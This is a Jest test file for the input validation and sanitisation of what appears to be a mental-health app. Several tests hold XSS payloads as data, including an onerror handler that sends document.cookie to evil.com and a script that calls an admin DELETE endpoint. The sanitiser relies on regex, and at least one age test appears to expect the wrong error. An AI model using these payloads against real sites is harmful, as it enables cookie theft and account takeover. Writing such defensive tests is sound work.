import { describe, expect, it, beforeEach, jest } from '@jest/globals'
import { z } from 'zod'
import { testHelpers, userFactory } from '@/lib/test-utils'

// Mock validation schemas (since we don't have the actual schema file)
const mockUserSchema = z.object({
  email: z.string().email('Invalid email format'),
  password: z.string().min(8, 'Password must be at least 8 characters'),
  firstName: z.string().min(1, 'First name is required'),
  lastName: z.string().min(1, 'Last name is required'),
  dateOfBirth: z.date().optional(),
  phoneNumber: z.string().optional(),
})

const mockMoodEntrySchema = z.object({
  moodScore: z.number().min(1, 'Mood score must be at least 1').max(10, 'Mood score must be at most 10'),
  anxietyLevel: z.number().min(1).max(10).optional(),
  energyLevel: z.number().min(1).max(10).optional(),
  notes: z.string().max(1000, 'Notes must be less than 1000 characters').optional(),
})

const mockCrisisReportSchema = z.object({
  severityLevel: z.number().min(1).max(5),
  triggerType: z.enum(['suicidal_ideation', 'self_harm', 'panic_attack', 'psychotic_episode', 'substance_abuse']),
  description: z.string().min(10, 'Description must be at least 10 characters'),
  immediateRisk: z.boolean(),
})

// Mock validation service
class ValidationService {
  validateUser(data: unknown) {
    try {
      return { success: true, data: mockUserSchema.parse(data) }
    } catch (error) {
      return { success: false, error: error instanceof z.ZodError ? error.errors : [{ message: 'Validation failed' }] }
    }
  }

  validateMoodEntry(data: unknown) {
    try {
      return { success: true, data: mockMoodEntrySchema.parse(data) }
    } catch (error) {
      return { success: false, error: error instanceof z.ZodError ? error.errors : [{ message: 'Validation failed' }] }
    }
  }

  validateCrisisReport(data: unknown) {
    try {
      return { success: true, data: mockCrisisReportSchema.parse(data) }
    } catch (error) {
      return { success: false, error: error instanceof z.ZodError ? error.errors : [{ message: 'Validation failed' }] }
    }
  }

  sanitizeInput(input: string): string {
    return input
      .trim()
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<[^>]+>/g, '')
      .substring(0, 5000) // Limit length
  }

  validateEmail(email: string): boolean {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailRegex.test(email)
  }

  validatePassword(password: string): { valid: boolean; errors: string[] } {
    const errors: string[] = []
    
    if (password.length < 8) {
      errors.push('Password must be at least 8 characters long')
    }
    if (password.length > 128) {
      errors.push('Password must be less than 128 characters')
    }
    if (!/[a-z]/.test(password)) {
      errors.push('Password must contain at least one lowercase letter')
    }
    if (!/[A-Z]/.test(password)) {
      errors.push('Password must contain at least one uppercase letter')
    }
    if (!/[0-9]/.test(password)) {
      errors.push('Password must contain at least one number')
    }
    if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
      errors.push('Password must contain at least one special character')
    }

    return { valid: errors.length === 0, errors }
  }

  validatePhoneNumber(phone: string): boolean {
    const phoneRegex = /^\+?[\d\s\-\(\)]{10,15}$/
    return phoneRegex.test(phone)
  }

  validateAge(dateOfBirth: Date): { valid: boolean; age?: number; error?: string } {
    const today = new Date()
    const age = today.getFullYear() - dateOfBirth.getFullYear()
    const monthDiff = today.getMonth() - dateOfBirth.getMonth()
    
    const actualAge = monthDiff < 0 || (monthDiff === 0 && today.getDate() < dateOfBirth.getDate()) 
      ? age - 1 
      : age

    if (actualAge < 13) {
      return { valid: false, error: 'Must be at least 13 years old' }
    }
    
    if (actualAge > 120) {
      return { valid: false, error: 'Invalid date of birth' }
    }

    return { valid: true, age: actualAge }
  }
}

describe('Validation Service', () => {
  let validationService: ValidationService

  beforeEach(() => {
    validationService = new ValidationService()
  })

  describe('validateUser', () => {
    it('should validate valid user data', () => {
      const validUser = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        firstName: 'John',
        lastName: 'Doe',
      }

      const result = validationService.validateUser(validUser)

      expect(result.success).toBe(true)
      expect(result.data).toEqual(validUser)
    })

    it('should reject invalid email', () => {
      const invalidUser = {
        email: 'invalid-email',
        password: 'SecurePass123!',
        firstName: 'John',
        lastName: 'Doe',
      }

      const result = validationService.validateUser(invalidUser)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'Invalid email format' })
      )
    })

    it('should reject short password', () => {
      const invalidUser = {
        email: 'test@example.com',
        password: '123',
        firstName: 'John',
        lastName: 'Doe',
      }

      const result = validationService.validateUser(invalidUser)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'Password must be at least 8 characters' })
      )
    })

    it('should reject missing required fields', () => {
      const invalidUser = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        lastName: 'Doe',
        // Missing firstName
      }

      const result = validationService.validateUser(invalidUser)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'First name is required' })
      )
    })

    it('should handle optional fields', () => {
      const userWithOptionals = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        firstName: 'John',
        lastName: 'Doe',
        dateOfBirth: new Date('1990-01-01'),
        phoneNumber: '+1234567890',
      }

      const result = validationService.validateUser(userWithOptionals)

      expect(result.success).toBe(true)
      expect(result.data).toEqual(userWithOptionals)
    })
  })

  describe('validateMoodEntry', () => {
    it('should validate valid mood entry', () => {
      const validEntry = {
        moodScore: 7,
        anxietyLevel: 3,
        energyLevel: 8,
        notes: 'Feeling pretty good today',
      }

      const result = validationService.validateMoodEntry(validEntry)

      expect(result.success).toBe(true)
      expect(result.data).toEqual(validEntry)
    })

    it('should reject invalid mood score range', () => {
      const invalidEntry = {
        moodScore: 11, // Out of range
        anxietyLevel: 5,
      }

      const result = validationService.validateMoodEntry(invalidEntry)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'Mood score must be at most 10' })
      )
    })

    it('should reject mood score below minimum', () => {
      const invalidEntry = {
        moodScore: 0, // Below minimum
      }

      const result = validationService.validateMoodEntry(invalidEntry)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'Mood score must be at least 1' })
      )
    })

    it('should reject notes that are too long', () => {
      const invalidEntry = {
        moodScore: 5,
        notes: 'x'.repeat(1001), // Too long
      }

      const result = validationService.validateMoodEntry(invalidEntry)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'Notes must be less than 1000 characters' })
      )
    })

    it('should handle minimal valid entry', () => {
      const minimalEntry = {
        moodScore: 5,
      }

      const result = validationService.validateMoodEntry(minimalEntry)

      expect(result.success).toBe(true)
      expect(result.data).toEqual(minimalEntry)
    })
  })

  describe('validateCrisisReport', () => {
    it('should validate valid crisis report', () => {
      const validReport = {
        severityLevel: 3,
        triggerType: 'panic_attack' as const,
        description: 'Patient experienced severe panic attack during session',
        immediateRisk: false,
      }

      const result = validationService.validateCrisisReport(validReport)

      expect(result.success).toBe(true)
      expect(result.data).toEqual(validReport)
    })

    it('should reject invalid severity level', () => {
      const invalidReport = {
        severityLevel: 6, // Out of range
        triggerType: 'panic_attack' as const,
        description: 'Valid description here',
        immediateRisk: false,
      }

      const result = validationService.validateCrisisReport(invalidReport)

      expect(result.success).toBe(false)
    })

    it('should reject invalid trigger type', () => {
      const invalidReport = {
        severityLevel: 3,
        triggerType: 'invalid_type' as any,
        description: 'Valid description here',
        immediateRisk: false,
      }

      const result = validationService.validateCrisisReport(invalidReport)

      expect(result.success).toBe(false)
    })

    it('should reject short description', () => {
      const invalidReport = {
        severityLevel: 3,
        triggerType: 'panic_attack' as const,
        description: 'Too short', // Less than 10 characters
        immediateRisk: false,
      }

      const result = validationService.validateCrisisReport(invalidReport)

      expect(result.success).toBe(false)
      expect(result.error).toContainEqual(
        expect.objectContaining({ message: 'Description must be at least 10 characters' })
      )
    })
  })

  describe('sanitizeInput', () => {
    it('should remove script tags', () => {
      const maliciousInput = 'Hello <script>alert("xss")</script> World'
      const sanitized = validationService.sanitizeInput(maliciousInput)
      
      expect(sanitized).toBe('Hello  World')
      expect(sanitized).not.toContain('<script>')
    })

    it('should remove HTML tags', () => {
      const htmlInput = 'Hello <b>bold</b> and <i>italic</i> text'
      const sanitized = validationService.sanitizeInput(htmlInput)
      
      expect(sanitized).toBe('Hello bold and italic text')
    })

    it('should trim whitespace', () => {
      const paddedInput = '  hello world  '
      const sanitized = validationService.sanitizeInput(paddedInput)
      
      expect(sanitized).toBe('hello world')
    })

    it('should limit input length', () => {
      const longInput = 'x'.repeat(6000)
      const sanitized = validationService.sanitizeInput(longInput)
      
      expect(sanitized.length).toBe(5000)
    })

    it('should handle empty input', () => {
      const emptyInput = ''
      const sanitized = validationService.sanitizeInput(emptyInput)
      
      expect(sanitized).toBe('')
    })

    it('should handle complex XSS attempts', () => {
      const xssAttempt = '<img src=x onerror=alert(1)>'
      const sanitized = validationService.sanitizeInput(xssAttempt)
      
      expect(sanitized).not.toContain('<img')
      expect(sanitized).not.toContain('onerror')
    })
  })

  describe('validateEmail', () => {
    it('should validate correct email formats', () => {
      const validEmails = [
        'test@example.com',
        'user.name@domain.co.uk',
        'user+tag@example.org',
        'test_user123@test-domain.com',
      ]

      validEmails.forEach(email => {
        expect(validationService.validateEmail(email)).toBe(true)
      })
    })

    it('should reject invalid email formats', () => {
      const invalidEmails = [
        'plainaddress',
        '@missinglocal.com',
        'missing@.com',
        'missing.domain@.com',
        'two@@domain.com',
        'spaces in@email.com',
      ]

      invalidEmails.forEach(email => {
        expect(validationService.validateEmail(email)).toBe(false)
      })
    })
  })

  describe('validatePassword', () => {
    it('should validate strong password', () => {
      const strongPassword = 'StrongPass123!'
      const result = validationService.validatePassword(strongPassword)
      
      expect(result.valid).toBe(true)
      expect(result.errors).toEqual([])
    })

    it('should reject password without uppercase', () => {
      const weakPassword = 'weakpass123!'
      const result = validationService.validatePassword(weakPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Password must contain at least one uppercase letter')
    })

    it('should reject password without lowercase', () => {
      const weakPassword = 'WEAKPASS123!'
      const result = validationService.validatePassword(weakPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Password must contain at least one lowercase letter')
    })

    it('should reject password without numbers', () => {
      const weakPassword = 'WeakPassword!'
      const result = validationService.validatePassword(weakPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Password must contain at least one number')
    })

    it('should reject password without special characters', () => {
      const weakPassword = 'WeakPassword123'
      const result = validationService.validatePassword(weakPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Password must contain at least one special character')
    })

    it('should reject password that is too short', () => {
      const shortPassword = 'Weak1!'
      const result = validationService.validatePassword(shortPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Password must be at least 8 characters long')
    })

    it('should reject password that is too long', () => {
      const longPassword = 'A'.repeat(129) + '1!'
      const result = validationService.validatePassword(longPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors).toContain('Password must be less than 128 characters')
    })

    it('should return multiple errors for very weak password', () => {
      const veryWeakPassword = '123'
      const result = validationService.validatePassword(veryWeakPassword)
      
      expect(result.valid).toBe(false)
      expect(result.errors.length).toBeGreaterThan(1)
      expect(result.errors).toContain('Password must be at least 8 characters long')
      expect(result.errors).toContain('Password must contain at least one lowercase letter')
      expect(result.errors).toContain('Password must contain at least one uppercase letter')
    })
  })

  describe('validatePhoneNumber', () => {
    it('should validate correct phone formats', () => {
      const validPhones = [
        '+1234567890',
        '1234567890',
        '+1 (234) 567-8900',
        '234-567-8900',
        '+44 20 7946 0958',
      ]

      validPhones.forEach(phone => {
        expect(validationService.validatePhoneNumber(phone)).toBe(true)
      })
    })

    it('should reject invalid phone formats', () => {
      const invalidPhones = [
        '123',
        'abcdefghij',
        '123456789012345678', // Too long
        '+',
        '123 456',
      ]

      invalidPhones.forEach(phone => {
        expect(validationService.validatePhoneNumber(phone)).toBe(false)
      })
    })
  })

  describe('validateAge', () => {
    it('should validate adult age', () => {
      const dateOfBirth = new Date('1990-01-01')
      const result = validationService.validateAge(dateOfBirth)
      
      expect(result.valid).toBe(true)
      expect(result.age).toBeGreaterThan(30)
    })

    it('should reject underage users', () => {
      const recentDate = new Date()
      recentDate.setFullYear(recentDate.getFullYear() - 10) // 10 years old
      
      const result = validationService.validateAge(recentDate)
      
      expect(result.valid).toBe(false)
      expect(result.error).toBe('Must be at least 13 years old')
    })

    it('should reject unrealistic future dates', () => {
      const futureDate = new Date()
      futureDate.setFullYear(futureDate.getFullYear() + 10)
      
      const result = validationService.validateAge(futureDate)
      
      expect(result.valid).toBe(false)
      expect(result.error).toBe('Invalid date of birth')
    })

    it('should reject unrealistic old ages', () => {
      const veryOldDate = new Date('1900-01-01')
      const result = validationService.validateAge(veryOldDate)
      
      expect(result.valid).toBe(false)
      expect(result.error).toBe('Invalid date of birth')
    })

    it('should handle edge case of 13th birthday today', () => {
      const exactly13Today = new Date()
      exactly13Today.setFullYear(exactly13Today.getFullYear() - 13)
      
      const result = validationService.validateAge(exactly13Today)
      
      expect(result.valid).toBe(true)
      expect(result.age).toBe(13)
    })

    it('should handle leap year calculations', () => {
      const leapYearBirth = new Date('2000-02-29') // Leap year
      const result = validationService.validateAge(leapYearBirth)
      
      expect(result.valid).toBe(true)
      expect(result.age).toBeGreaterThan(20)
    })
  })

  describe('Edge Cases and Error Handling', () => {
    it('should handle null input gracefully', () => {
      const result = validationService.validateUser(null)
      
      expect(result.success).toBe(false)
      expect(result.error).toBeTruthy()
    })

    it('should handle undefined input', () => {
      const result = validationService.validateMoodEntry(undefined)
      
      expect(result.success).toBe(false)
      expect(result.error).toBeTruthy()
    })

    it('should handle empty object', () => {
      const result = validationService.validateUser({})
      
      expect(result.success).toBe(false)
      expect(result.error).toBeTruthy()
    })

    it('should handle array input', () => {
      const result = validationService.validateUser([])
      
      expect(result.success).toBe(false)
      expect(result.error).toBeTruthy()
    })

    it('should sanitize extremely malicious input', () => {
      const maliciousInput = `
        <script>
          fetch('/api/admin/users', {
            method: 'DELETE',
            headers: {'X-CSRF-Token': document.cookie}
          })
        </script>
        <img src="x" onerror="location.href='http://evil.com?cookie='+document.cookie">
      `
      
      const sanitized = validationService.sanitizeInput(maliciousInput)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('<img')
      expect(sanitized).not.toContain('onerror')
      expect(sanitized).not.toContain('fetch')
    })

    it('should handle international characters in names', () => {
      const internationalUser = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        firstName: 'José',
        lastName: 'García-López',
      }

      const result = validationService.validateUser(internationalUser)

      expect(result.success).toBe(true)
      expect(result.data).toEqual(internationalUser)
    })

    it('should validate mood scores at boundaries', () => {
      const boundaryEntries = [
        { moodScore: 1 }, // Minimum
        { moodScore: 10 }, // Maximum
      ]

      boundaryEntries.forEach(entry => {
        const result = validationService.validateMoodEntry(entry)
        expect(result.success).toBe(true)
      })
    })

    it('should handle complex nested validation errors', () => {
      const complexInvalidData = {
        email: 'invalid',
        password: '123',
        firstName: '',
        lastName: '',
      }

      const result = validationService.validateUser(complexInvalidData)

      expect(result.success).toBe(false)
      expect(result.error?.length).toBeGreaterThan(1)
    })
  })
})